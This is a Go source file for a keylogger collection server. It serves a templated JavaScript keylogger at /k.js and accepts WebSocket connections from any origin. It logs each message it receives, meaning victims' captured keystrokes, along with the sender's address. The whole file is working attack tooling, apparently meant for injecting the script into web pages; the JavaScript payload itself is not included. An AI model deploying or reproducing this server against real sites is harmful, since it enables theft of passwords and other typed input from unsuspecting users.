package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"text/template"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

var (
	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}

	listenAddr string
	jsFile     string
	jsTemplate *template.Template
)

func init() {
	flag.StringVar(&listenAddr, "l", "127.0.0.1:8080", "Listen address")
	flag.StringVar(&jsFile, "j", "logger.js", "Keylogger JS file location")
	flag.Parse()
	var err error
	jsTemplate, err = template.ParseFiles(jsFile)
	if err != nil {
		log.Fatal(err)
	}
}

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/ws", serveWS)
	r.HandleFunc("/k.js", serveJSKeylogger)

	fmt.Printf("Listening on %s\n", listenAddr)
	log.Fatal(http.ListenAndServe(listenAddr, r))
}

func serveWS(w http.ResponseWriter, req *http.Request) {
	conn, err := upgrader.Upgrade(w, req, nil)
	if err != nil {
		http.Error(w, "Something went wrong upgrading the websocket", 500)
		log.Printf("Something went wrong upgrading the websocket: %s", err)
		return
	}
	defer conn.Close()
	connAddr := conn.RemoteAddr().String()
	fmt.Printf("WS connection received from: %s\n", connAddr)
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			fmt.Printf("Something went wrong with ws to %s: %s\n", connAddr, err)
			return
		}
		fmt.Printf("From %s: %s\n", connAddr, string(msg))
	}
}

func serveJSKeylogger(w http.ResponseWriter, req *http.Request) {
	w.Header().Set("Content-Type", "application/javascript")
	jsTemplate.Execute(w, listenAddr)
}
